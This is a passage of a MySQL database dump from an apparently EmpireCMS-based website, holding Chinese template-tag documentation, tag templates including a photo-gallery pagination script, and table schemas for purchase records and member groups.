</div>\r\n            </td>\r\n            <td height=\\\"25\\\">查看标签模板ID点<a onclick=\\\"window.open(\\\'ListBqtemp.php?[!--ehash--]\\\');\\\"><strong><u>这里</u></strong></a></td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">&nbsp;</div>\r\n            </td>\r\n            <td height=\\\"25\\\">\r\n            <p><strong>模板标签变量说明：</strong><br />\r\n            图片集JS数组：[!--photor--]，缩略图导航：[!--smalldh--]<br />\r\n            分页导航：[!--select--]，标题分页导航：[!--titleselect--]，分页列表式导航：[!--listpage--]</p>\r\n            <p><strong>list.var模板标签：</strong><br />\r\n            图片名称：[!--picname--]，图片地址：[!--picurl--]</p>\r\n            </td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">导航图片宽度<br />\r\n            导航图片高度</div>\r\n            </td>\r\n            <td height=\\\"25\\\">0为按原图大小</td>\r\n        </tr>\r\n    </tbody>\r\n</table>\r\n</p>','sys_PhotoMorepage','eshowphoto',1,'[eshowphoto]标签模板ID,导航图片宽度,导航图片高度[/eshowphoto]',0,1,7),(25,'复选项输出函数','<p>如：[echocheckbox]\\\'title\\\',\\\'&lt;br&gt;\\\'[/echocheckbox]：表示按回车分隔输出title字段的项</p>','sys_EchoCheckboxFValue','echocheckbox',1,'[echocheckbox]\\\'字段\\\',\\\'分隔符\\\'[/echocheckbox]',0,3,5),(26,'相关链接标签','<p><strong>标签模板ID</strong>：查看标签模板ID点<a onclick=\\\"window.open(\\\'ListBqtemp.php?[!--ehash--]\\\');\\\"><strong><u>这里</u></strong></a><br />\r\n<strong>操作类型</strong>：0为默认；1为按表；2为按栏目；3为按标题分类<br />\r\n<strong>操作对象</strong>：对应操作类型的表/栏目/标题分类。空则为默认。<br />\r\n<strong>是否显示栏目名</strong>：0为不显示；1为显示<br />\r\n<strong>只显示标题图片的信息</strong>：0为不限；1为只显示标题图片的信息</p>','sys_GetOtherLinkInfo','otherlink',1,'[otherlink]标签模板ID,操作对象,调用条数,标题截取字数,是否显示栏目名,操作类型,只显示标题图片的信息[/otherlink]',0,1,9),(27,'评论调用标签','<p><strong>标签模板ID</strong>：查看标签模板ID点<a onclick=\\\"window.open(\\\'ListBqtemp.php?[!--ehash--]\\\');\\\"><strong><u>这里</u></strong></a><br />\r\n<strong>栏目ID</strong>：0为不限调用栏目，父栏目会应用于子栏目<br />\r\n<strong>信息ID</strong>：0为不限<br />\r\n<strong>显示推荐评论</strong>：0为不限；1为只显示推荐评论<br />\r\n<strong>操作类型</strong>：0为按发布时间；1为按支持数；2为按反对数<br />\r\n<strong>标签模板说明</strong>：[!--title--]:信息标题；[!--titleurl--]:信息链接；[!--titlepic--]:信息标题图片；[!--id--]:信息ID<br />\r\n[!--classid--]:栏目ID；[!--plid--]:评论ID；[!--username--]:发表者；[!--no--]:编号<br />\r\n[!--pltext--]:评论内容；[!--pltime--]:评论时间；[!--zcnum--]:支持数；[!--fdnum--]:反对数</p>','sys_ShowPlInfo','showplinfo',1,'[showplinfo]调用条数,标签模板ID,栏目ID,信息ID,显示推荐评论,操作类型[/showplinfo]',0,3,5),(28,'循环栏目导航标签','<p>\r\n<table border=\\\"0\\\" cellspacing=\\\"1\\\" cellpadding=\\\"3\\\" width=\\\"100%\\\" bgcolor=\\\"#dbeaf5\\\">\r\n    <tbody>\r\n        <tr>\r\n            <td>\r\n            <div align=\\\"center\\\">参数</div>\r\n            </td>\r\n            <td>参数说明</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">父栏目ID</div>\r\n            </td>\r\n            <td height=\\\"25\\\">查看栏目ID点<a onclick=\\\"window.open(\\\'../ListClass.php?[!--ehash--]\\\');\\\"><strong><u>这里</u></strong></a><br />\r\n            \\\'0\\\'为显示所有一级栏目<br />\r\n            \\\'selfinfo\\\'显示本栏目下级栏目<br />\r\n            多栏目固定调用可用&quot;,&quot;格开</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">\r\n            <div align=\\\"center\\\">标签模板ID</div>\r\n            </div>\r\n            </td>\r\n            <td height=\\\"25\\\">查看标签模板ID点<a onclick=\\\"window.open(\\\'ListBqtemp.php?[!--ehash--]\\\');\\\"><strong><u>这里</u></strong></a></td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">&nbsp;</div>\r\n            </td>\r\n            <td height=\\\"25\\\">\r\n            <p>模板标签变量说明：[!--bclassname--]：父栏目名,[!--bclassurl--]：父栏目链接,[!--bclassid--]：父栏目id，[!--bclassimg--]：父栏目图片,[!--bintro--]：父栏目简介,[!--bnum--]：父栏目信息数,[!--bno--]：父栏目序号</p>\r\n            <p>list.var模板标签：<br />\r\n            [!--classurl--]：栏目链接,[!--classname--]：栏目名称,[!--classid--]：栏目id,[!--classimg--]：栏目图片,[!--intro--]：栏目简介,[!--num--]：信息数,[!--no--]：序号</p>\r\n            </td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">是否显示栏目信息数</div>\r\n            </td>\r\n            <td height=\\\"25\\\">0为不显示，1为显示</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">显示栏目数</div>\r\n            </td>\r\n            <td height=\\\"25\\\">0为不限制</td>\r\n        </tr>\r\n    </tbody>\r\n</table>\r\n</p>','sys_ForShowSonClass','listshowclass',1,'[listshowclass]父栏目ID,标签模板ID,是否显示栏目信息数,显示栏目数[/listshowclass]',0,2,6),(29,'调用TAGS的信息标签','<table border=\\\"0\\\" cellspacing=\\\"1\\\" cellpadding=\\\"3\\\" width=\\\"100%\\\" bgcolor=\\\"#dbeaf5\\\">\r\n    <tbody>\r\n        <tr>\r\n            <td>\r\n            <div align=\\\"center\\\">参数</div>\r\n            </td>\r\n            <td>参数说明</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">TAGS的ID</div>\r\n            </td>\r\n            <td height=\\\"25\\\">查看TAGS的ID点<a onclick=\\\"window.open(\\\'../tags/ListTags.php?[!--ehash--]\\\');\\\"><strong><u>这里</u></strong></a><br />\r\n            多个ID可以用,号格开，如\\\'1,2\\\'</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">显示条数</div>\r\n            </td>\r\n            <td height=\\\"25\\\">显示前几条记录</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">标题截取数</div>\r\n            </td>\r\n            <td height=\\\"25\\\">截取几个字符</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">标签模板ID</div>\r\n            </td>\r\n            <td height=\\\"25\\\">查看标签模板ID点<a onclick=\\\"window.open(\\\'ListBqtemp.php?[!--ehash--]\\\');\\\"><strong><u>这里</u></strong></a></td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">栏目ID</div>\r\n            </td>\r\n            <td height=\\\"25\\\">限制只调用某一个或多个栏目的信息<br />\r\n            多个ID可以用,号格开，如\\\'1,2\\\'</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">系统模型ID</div>\r\n            </td>\r\n            <td height=\\\"25\\\">限制只调用某一个或多个系统模型的信息<br />\r\n            多个ID可以用,号格开，如\\\'1,2\\\'</td>\r\n        </tr>\r\n    </tbody>\r\n</table>','sys_eShowTagsInfo','tagsinfo',0,'[tagsinfo]TAGS的ID,显示条数,标题截取数,标签模板ID,栏目ID,系统模型ID[/tagsinfo]',0,0,9),(30,'调用碎片的信息标签','<table border=\\\"0\\\" cellspacing=\\\"1\\\" cellpadding=\\\"3\\\" width=\\\"100%\\\" bgcolor=\\\"#dbeaf5\\\">\r\n    <tbody>\r\n        <tr>\r\n            <td>\r\n            <div align=\\\"center\\\">参数</div>\r\n            </td>\r\n            <td>参数说明</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">碎片变量名</div>\r\n            </td>\r\n            <td height=\\\"25\\\">查看碎片变量名点<a onclick=\\\"window.open(\\\'../sp/ListSp.php?[!--ehash--]\\\');\\\"><strong><u>这里</u></strong></a></td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">显示条数</div>\r\n            </td>\r\n            <td height=\\\"25\\\">显示前几条记录</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">标题截取数</div>\r\n            </td>\r\n            <td height=\\\"25\\\">截取几个字符</td>\r\n        </tr>\r\n    </tbody>\r\n</table>\r\n<p><br />\r\n&nbsp;</p>\r\n<table border=\\\"0\\\" cellspacing=\\\"1\\\" cellpadding=\\\"3\\\" width=\\\"100%\\\" bgcolor=\\\"#dbeaf5\\\">\r\n    <tbody>\r\n        <tr>\r\n            <td colspan=\\\"2\\\">\r\n            <div align=\\\"center\\\">碎片标签模板变量说明</div>\r\n            </td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\" width=\\\"34%\\\">\r\n            <div align=\\\"center\\\">静态碎片</div>\r\n            </td>\r\n            <td height=\\\"25\\\" width=\\\"66%\\\">模板标签变量说明：[!--the.spname--]：碎片名称,[!--the.spid--]：碎片ID,[!--the.sppic--]：碎片效果图,[!--the.spsay--]：碎片描述\r\n            <p>list.var模板标签：<br />\r\n            [!--title--]：标题,[!--oldtitle--]：标题ALT,[!--newstime--]：发布时间,[!--id--]：碎片信息ID,[!--titleurl--]：标题链接,[!--titlepic--]：标题缩图,[!--bigpic--]：标题大图,[!--titlepre--]：标题左边,[!--titlenext--]：标题右边,[!--smalltext--]：内容简介,[!--no.num--]：编号</p>\r\n            </td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">动态碎片</div>\r\n            </td>\r\n            <td height=\\\"25\\\">模板标签变量说明：[!--the.spname--]：碎片名称,[!--the.spid--]：碎片ID,[!--the.sppic--]：碎片效果图,[!--the.spsay--]：碎片描述\r\n            <p>list.var模板标签：<br />\r\n            支持变量同模型信息调用</p>\r\n            </td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">代码碎片</div>\r\n            </td>\r\n            <td height=\\\"25\\\">无需标签模板，直接显示代码内容</td>\r\n        </tr>\r\n    </tbody>\r\n</table>','sys_eShowSpInfo','spinfo',0,'[spinfo]碎片变量名,显示条数,标题截取数[/spinfo]',0,0,9),(31,'调用TAGS标签','<table border=\\\"0\\\" cellspacing=\\\"1\\\" cellpadding=\\\"3\\\" width=\\\"100%\\\" bgcolor=\\\"#dbeaf5\\\">\r\n    <tbody>\r\n        <tr>\r\n            <td>\r\n            <div align=\\\"center\\\">参数</div>\r\n            </td>\r\n            <td>参数说明</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">分类ID</div>\r\n            </td>\r\n            <td height=\\\"25\\\">\\\'\\\'空为不限制，查看TAGS分类ID点<a onclick=\\\"window.open(\\\'../tags/TagsClass.php?[!--ehash--]\\\');\\\"><strong><u>这里</u></strong></a><br />\r\n            多个可以用,号格开，如\\\'1,2\\\'<br />\r\n            内容页显示当前TAGS可以用\\\'selfinfo\\\'</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">显示数量</div>\r\n            </td>\r\n            <td height=\\\"25\\\">显示前几条记录，0为显示所有（\\\'selfinfo\\\'本设置无效）</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">每行显示数量</div>\r\n            </td>\r\n            <td height=\\\"25\\\">一行显示多少个TAGS，0为不换行</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">显示排序</div>\r\n            </td>\r\n            <td height=\\\"25\\\">使用默认设置\\\'\\\'空就可以，默认是\\\'tagid desc\\\'（\\\'selfinfo\\\'本设置无效）</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">只显示推荐</div>\r\n            </td>\r\n            <td height=\\\"25\\\">只显示推荐的TAGS，0为不限制，1为限制（\\\'selfinfo\\\'本设置无效）</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">推荐TAGS属性</div>\r\n            </td>\r\n            <td height=\\\"25\\\">如果是推荐的TAGS，内容是否要加粗或加红（\\\'selfinfo\\\'本设置无效）<br />\r\n            设置\\\'s\\\'表示加粗、\\\'r\\\'表示加红、同时加粗加红用\\\'s,r\\\'</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">显示间隔符</div>\r\n            </td>\r\n            <td height=\\\"25\\\">TAGS之间显示间隔符，默认是\\\' &amp;nbsp; \\\'</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">是否显示信息数量</div>\r\n            </td>\r\n            <td height=\\\"25\\\">是否在TAGS后显示信息数量，0为不显示，1为显示（\\\'selfinfo\\\'本设置无效）</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">链接附加参数</div>\r\n            </td>\r\n            <td height=\\\"25\\\">可指定在TAGS链接后面增加参数，比如：\\\'&amp;tempid=模板ID\\\'</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">链接变量名</div>\r\n            </td>\r\n            <td height=\\\"25\\\">可指定在链接使用的变量名(需加引号)：tagname或tagid，默认为tagname，比如：\\\'tagname\\\'</td>\r\n        </tr>\r\n    </tbody>\r\n</table>','sys_eShowTags','showtags',0,'[showtags]分类ID,显示数量,每行显示数量,显示排序,只显示推荐,推荐TAGS属性,显示间隔符,是否显示信息数,链接附加参数,链接变量名[/showtags]',0,0,9);
/*!40000 ALTER TABLE `libang_enewsbq` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsbqclass`
--

DROP TABLE IF EXISTS `libang_enewsbqclass`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsbqclass` (
  `classid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `classname` char(30) NOT NULL DEFAULT '',
  PRIMARY KEY (`classid`)
) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsbqclass`
--

LOCK TABLES `libang_enewsbqclass` WRITE;
/*!40000 ALTER TABLE `libang_enewsbqclass` DISABLE KEYS */;
INSERT INTO `libang_enewsbqclass` VALUES (1,'信息调用'),(2,'栏目调用'),(3,'非信息调用'),(4,'其它标签');
/*!40000 ALTER TABLE `libang_enewsbqclass` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsbqtemp`
--

DROP TABLE IF EXISTS `libang_enewsbqtemp`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsbqtemp` (
  `tempid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `tempname` varchar(60) NOT NULL DEFAULT '',
  `modid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `temptext` text NOT NULL,
  `showdate` varchar(50) NOT NULL DEFAULT '',
  `listvar` text NOT NULL,
  `subnews` smallint(5) unsigned NOT NULL DEFAULT '0',
  `rownum` smallint(5) unsigned NOT NULL DEFAULT '0',
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `docode` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`tempid`),
  KEY `classid` (`classid`)
) ENGINE=MyISAM AUTO_INCREMENT=13 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsbqtemp`
--

LOCK TABLES `libang_enewsbqtemp` WRITE;
/*!40000 ALTER TABLE `libang_enewsbqtemp` DISABLE KEYS */;
INSERT INTO `libang_enewsbqtemp` VALUES (1,'子栏目导航标签模板',1,'[!--empirenews.listtemp--]<!--list.var1-->[!--empirenews.listtemp--]','Y-m-d H:i:s','<dd><a href=\\\'[!--classurl--]\\\'>[!--classname--]</a></dd>',0,1,0,0),(2,'标题列表模板',1,'[!--empirenews.listtemp--]<!--list.var1-->[!--empirenews.listtemp--]','Y-m-d H:i:s','<li><a href=\"[!--titleurl--]\" title=\"[!--oldtitle--]\">[!--title--]</a></li>',0,1,0,0),(3,'标题+简介',1,'[!--empirenews.listtemp--]<!--list.var1-->[!--empirenews.listtemp--]','m-d','<li><p><strong><a href=\"[!--titleurl--]\" title=\"[!--oldtitle--]\">[!--title--]</a></strong>[!--smalltext--] </p></li>',60,1,0,0),(4,'头条相关',1,'[!--empirenews.listtemp--]<!--list.var1-->　<!--list.var2-->[!--empirenews.listtemp--]','Y-m-d H:i:s','<a href=\"[!--titleurl--]\" title=\"[!--oldtitle--]\">·[!--title--]</a>',0,2,0,0),(5,'图片+标题+简介',1,'[!--empirenews.listtemp--]\r\n<!--list.var1-->\r\n[!--empirenews.listtemp--]','Y-m-d H:i:s','<table width=\\\"94%\\\" border=\\\"0\\\" align=\\\"center\\\" cellpadding=\\\"0\\\" cellspacing=\\\"6\\\" class=\\\"picText\\\">\r\n<tr valign=\\\"top\\\">\r\n<td><a href=\\\"[!--titleurl--]\\\" target=\\\"_blank\\\"><img width=\\\"70\\\" height=\\\"78\\\" src=\\\"[!--titlepic--]\\\" alt=\\\"[!--oldtitle--]\\\" /></a></td>\r\n<td><strong><a href=\\\"[!--titleurl--]\\\" title=\\\"[!--oldtitle--]\\\">[!--title--]</a></strong>[!--smalltext--]</td>\r\n</tr>\r\n</table>',56,1,0,0),(7,'循环子栏目标签',1,'<table width=\"100%\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\" class=\"title\">\r\n<tr>\r\n<td><strong>[!--the.classname--]</strong></td>\r\n<td align=\"right\"><a href=\"[!--the.classurl--]\">更多&gt;&gt;</a></td>\r\n</tr>\r\n</table>\r\n<table width=\"100%\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\" class=\"box\">\r\n<tr>\r\n<td><ul>\r\n       [!--empirenews.listtemp--]\r\n       <!--list.var1-->\r\n       [!--empirenews.listtemp--]\r\n</ul>\r\n</td>\r\n</tr>\r\n</table>','Y-m-d','<li><a href=\"[!--titleurl--]\" title=\"[!--oldtitle--]\">[!--title--]</a> <span>[!--newstime--]</span></li>',0,1,0,0),(8,'头条标题',1,'[!--empirenews.listtemp--]\r\n<!--list.var1-->\r\n[!--empirenews.listtemp--]','Y-m-d H:i:s','<strong><a href=\"[!--titleurl--]\">[!--title--]</a></strong>\r\n<p>　　[!--smalltext--]</p>',150,1,0,0),(9,'标题+软件简介',2,'[!--empirenews.listtemp--]<!--list.var1-->[!--empirenews.listtemp--]','Y-m-d H:i:s','<li><p><strong><a href=\\\"[!--titleurl--]\\\" title=\\\"[!--oldtitle--]\\\">[!--title--]</a></strong>[!--softsay--]</p></li>',50,1,0,0),(10,'排行列表',1,'[!--empirenews.listtemp--]<!--list.var1-->[!--empirenews.listtemp--]','Y-m-d H:i:s','<li class=\"no[!--no.num--]\"><a href=\"[!--titleurl--]\" title=\"[!--oldtitle--]\">[!--title--]</a></li>',0,1,0,0),(11,'图片集分页模板',1,'<script type=\\\"text/javascript\\\">\r\n        var photosr=new Array();\r\n        [!--photor--]\r\n        function GotoPhPage(page){\r\n                page=parseInt(page);\r\n                document.getElementById(\\\"showpagephoto\\\").innerHTML=photosr[page];\r\n                document.ViewPhotoForm.thisphpage.value=page;\r\n                document.ViewPhotoForm.tothephpage.options[page-1].selected=true;\r\n        }\r\n        //上一页\r\n        function PriPhPage(){\r\n                var thispage=parseInt(document.ViewPhotoForm.thisphpage.value);\r\n                var num=photosr.length;\r\n                if(thispage<=1)\r\n                {\r\n                        return false;\r\n                }\r\n                GotoPhPage(thispage-1);\r\n        }\r\n        //下一页\r\n        function NextPhPage(){\r\n                var thispage=parseInt(document.ViewPhotoForm.thisphpage.value);\r\n                var num=photosr.length;\r\n                if(thispage>=num-1)\r\n                {\r\n                        return false;\r\n                }\r\n                GotoPhPage(thispage+1);\r\n        }\r\n        function PhAutoPlay(){\r\n                var sec=parseInt(document.ViewPhotoForm.autoplaysec.value);\r\n                var i;\r\n                var num=photosr.length;\r\n                for(i=1;i<=sec;i++)\r\n                {\r\n                        if(document.ViewPhotoForm.autophstop.value==0)\r\n                        {\r\n                                window.setTimeout(\\\"PhAutoPlayExe(\\\"+i+\\\",\\\"+sec+\\\")\\\",i*1000);\r\n                        }\r\n                        else\r\n                        {\r\n                                break;\r\n                        }\r\n                }\r\n        }\r\n        function PhAutoPlayExe(num,sec){\r\n                var t;\r\n                if(document.ViewPhotoForm.autophstop.value==1)\r\n                {\r\n                        return \\\"\\\";\r\n                }\r\n                if(num==sec) \r\n                {\r\n                        t=NextPhPage();\r\n                        if(t==false)\r\n                        {\r\n                                GotoPhPage(1);\r\n                        }\r\n                        PhAutoPlay();\r\n                } \r\n        }\r\n        </script>\r\n        \r\n<table width=\\\"100%\\\" border=\\\"0\\\" align=\\\"center\\\" cellpadding=\\\"3\\\" cellspacing=\\\"1\\\">\r\n  <tr> \r\n    <td height=\\\"25\\\" id=\\\"showpagephoto\\\" align=\\\"center\\\"> \r\n      <!--list.var1-->\r\n    </td>\r\n  </tr>\r\n  <form name=\\\"ViewPhotoForm\\\" id=\\\"ViewPhotoForm\\\" method=\\\"POST\\\" action=\\\"\\\">\r\n    <tr> \r\n      <td height=\\\"25\\\"> <div align=\\\"center\\\"> \r\n          <input type=\\\"button\\\" name=\\\"Submit\\\" value=\\\"上一页\\\" onclick=\\\"PriPhPage();\\\">\r\n          &nbsp;&nbsp; \r\n          <select name=\\\"tothephpage\\\" onchange=\\\"GotoPhPage(this.options[this.selectedIndex].value)\\\">\r\n            [!--select--]\r\n          </select>\r\n          &nbsp;&nbsp; \r\n          <input type=\\\"button\\\" name=\\\"Submit2\\\" value=\\\"下一页\\\" onclick=\\\"NextPhPage();\\\">\r\n          <input name=\\\"thisphpage\\\" type=\\\"hidden\\\" value=\\\"1\\\">\r\n        </div></td>\r\n    </tr>\r\n    <tr>\r\n      <td height=\\\"25\\\"><div align=\\\"center\\\">\r\n          <select name=\\\"autoplaysec\\\">\r\n            <option value=\\\"1\\\">1秒</option>\r\n            <option value=\\\"2\\\">2秒</option>\r\n            <option value=\\\"3\\\" selected>3秒</option>\r\n            <option value=\\\"4\\\">4秒</option>\r\n            <option value=\\\"5\\\">5秒</option>\r\n            <option value=\\\"6\\\">6秒</option>\r\n            <option value=\\\"7\\\">7秒</option>\r\n            <option value=\\\"8\\\">8秒</option>\r\n            <option value=\\\"9\\\">9秒</option>\r\n            <option value=\\\"10\\\">10秒</option>\r\n          </select>\r\n                  <input name=\\\"autophstop\\\" type=\\\"hidden\\\" value=\\\"0\\\">\r\n          <input type=\\\"button\\\" name=\\\"Submit3\\\" value=\\\"自动播放\\\" onclick=\\\"document.ViewPhotoForm.autophstop.value=0;PhAutoPlay();\\\">\r\n          &nbsp;<input type=\\\"button\\\" name=\\\"Submit32\\\" value=\\\"停止播放\\\" onclick=\\\"document.ViewPhotoForm.autophstop.value=1;\\\">\r\n        </div></td>\r\n    </tr>\r\n  </form>\r\n</table>\r\n<table width=\\\"500\\\" border=\\\"0\\\" align=\\\"center\\\" cellpadding=\\\"3\\\" cellspacing=\\\"1\\\">\r\n<tr><td>\r\n<marquee  behavior=alternate ONMOUSEOUT=\\\"this.scrollDelay=1\\\" ONMOUSEOVER=\\\"this.scrollDelay=600\\\"  scrollamount=1  SCROLLDELAY=1  border=0  scrolldelay=70  width=\\\"100%\\\"  align=middle>\r\n        [!--smalldh--]\r\n</marquee>\r\n</td></tr></table>','Y-m-d H:i:s','<a href=\\\'#ecms\\\' onclick=\\\'NextPhPage();\\\' title=\\\'点击进入下一张图片\\\'><img src=\\\'[!--picurl--]\\\' alt=\\\'[!--picname--]\\\' border=1 class=\\\'photoresize\\\'></a><br><span style=\\\'line-height=18pt\\\'>[!--picname--]</span>',0,1,0,0),(12,'栏目tabs导航',1,'[!--empirenews.listtemp--]<!--list.var1-->[!--empirenews.listtemp--]','Y-m-d H:i:s','<li id=\"tabnav_btn_[!--no--]\" onmouseover=\"tabit(this)\"><a href=\"[!--classurl--]\">[!--classname--]</a></li>',0,1,0,0);
/*!40000 ALTER TABLE `libang_enewsbqtemp` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsbqtempclass`
--

DROP TABLE IF EXISTS `libang_enewsbqtempclass`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsbqtempclass` (
  `classid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `classname` char(30) NOT NULL DEFAULT '',
  PRIMARY KEY (`classid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsbqtempclass`
--

LOCK TABLES `libang_enewsbqtempclass` WRITE;
/*!40000 ALTER TABLE `libang_enewsbqtempclass` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsbqtempclass` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsbuybak`
--

DROP TABLE IF EXISTS `libang_enewsbuybak`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsbuybak` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `username` char(20) NOT NULL DEFAULT '',
  `card_no` char(120) NOT NULL DEFAULT '',
  `buytime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `cardfen` int(10) unsigned NOT NULL DEFAULT '0',
  `money` int(10) unsigned NOT NULL DEFAULT '0',
  `userid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `userdate` int(10) unsigned NOT NULL DEFAULT '0',
  `type` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `userid` (`userid`),
  KEY `type` (`type`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsbuybak`
--

LOCK TABLES `libang_enewsbuybak` WRITE;
/*!40000 ALTER TABLE `libang_enewsbuybak` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsbuybak` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsbuygroup`
--

DROP TABLE IF EXISTS `libang_enewsbuygroup`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsbuygroup` (
  `id` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `gname` varchar(255) NOT NULL DEFAULT '',
  `gmoney` int(10) unsigned NOT NULL DEFAULT '0',
  `gfen` int(10) unsigned NOT NULL DEFAULT '0',
  `gdate` int(10) unsigned NOT NULL DEFAULT '0',
  `ggroupid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `gzgroupid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `buygroupid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `gsay` text NOT NULL,
  `myorder` smallint(5) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsbuygroup`
--

LOCK TABLES `libang_enewsbuygroup` WRITE;
/*!40000 ALTER TABLE `libang_enewsbuygroup` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsbuygroup` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewscard`
--

DROP TABLE IF EXISTS `libang_enewscard`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
